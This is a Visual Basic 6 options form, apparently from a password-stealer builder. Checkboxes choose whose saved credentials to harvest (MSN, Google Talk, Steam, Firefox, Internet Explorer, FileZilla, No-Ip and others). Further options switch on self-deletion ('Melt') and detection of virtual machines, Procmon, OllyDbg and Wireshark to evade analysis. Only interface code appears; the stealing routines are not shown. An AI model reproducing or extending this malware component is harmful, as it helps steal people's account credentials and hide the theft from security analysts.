VERSION 5.00
Begin VB.Form frmOptions 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Options"
   ClientHeight    =   5175
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   3855
   Icon            =   "frmOptions.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5175
   ScaleWidth      =   3855
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  'CenterOwner
   Begin VB.Frame frameMenu 
      Caption         =   "Recovery Options"
      Height          =   2775
      Index           =   4
      Left            =   120
      TabIndex        =   16
      Top             =   120
      Width           =   3615
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Paltalk Scene"
         Height          =   255
         Index           =   4
         Left            =   120
         TabIndex        =   17
         Top             =   1200
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "FileZilla / FlashFXP"
         Height          =   255
         Index           =   9
         Left            =   120
         TabIndex        =   8
         Top             =   2400
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "MSN Messenger (7.xx 8.xx 9.xx)"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   0
         Top             =   240
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Google Talk"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   1
         Top             =   480
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Trillian"
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   2
         Top             =   720
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Pidgin / Gaim"
         Height          =   255
         Index           =   3
         Left            =   120
         TabIndex        =   3
         Top             =   960
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Steam"
         Height          =   255
         Index           =   5
         Left            =   120
         TabIndex        =   4
         Top             =   1440
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "No-Ip / DynDNS"
         Height          =   255
         Index           =   6
         Left            =   120
         TabIndex        =   5
         Top             =   1680
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Firefox (2.xx 3.xx)"
         Height          =   255
         Index           =   7
         Left            =   120
         TabIndex        =   6
         Top             =   1920
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkRecovery 
         Caption         =   "Internet Explorer (7.xx 8.xx)"
         Height          =   255
         Index           =   8
         Left            =   120
         TabIndex        =   7
         Top             =   2160
         Value           =   1  'Checked
         Width           =   3375
      End
   End
   Begin VB.Frame frameMenu 
      Caption         =   "General Options"
      Height          =   1575
      Index           =   3
      Left            =   120
      TabIndex        =   15
      Top             =   3000
      Width           =   3615
      Begin VB.CheckBox checkGeneral 
         Caption         =   "Melt                                  Self removal"
         Height          =   255
         Index           =   4
         Left            =   120
         TabIndex        =   13
         Top             =   1200
         Width           =   3375
      End
      Begin VB.CheckBox checkGeneral 
         Caption         =   "Anti Procmon                    Monitor"
         Height          =   255
         Index           =   3
         Left            =   120
         TabIndex        =   12
         Top             =   960
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkGeneral 
         Caption         =   "Anti VirtualPC / VMWare  Emulator"
         Height          =   255
         Index           =   0
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkGeneral 
         Caption         =   "Anti Ollydbg                      Debugger"
         Height          =   255
         Index           =   2
         Left            =   120
         TabIndex        =   11
         Top             =   720
         Value           =   1  'Checked
         Width           =   3375
      End
      Begin VB.CheckBox checkGeneral 
         Caption         =   "Anti Wire-Shark                Sniffer"
         Height          =   255
         Index           =   1
         Left            =   120
         TabIndex        =   10
         Top             =   480
         Value           =   1  'Checked
         Width           =   3375
      End
   End
   Begin VB.CommandButton cmdClose 
      Caption         =   "Close"
      Height          =   350
      Left            =   2880
      TabIndex        =   14
      Top             =   4680
      Width           =   855
   End
End
Attribute VB_Name = "frmOptions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub checkRecovery_Click(Index As Integer)
    Dim i As Integer
    For i = 0 To 9
        If frmOptions.checkRecovery(i).Value = 1 Then Exit Sub
    Next i
    frmOptions.checkRecovery(Index).Value = 1
    MsgBox "At least one option must be selected.", vbExclamation
End Sub

Private Sub cmdClose_Click()
    Me.Hide
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Me.Hide
    Cancel = 1
End Sub
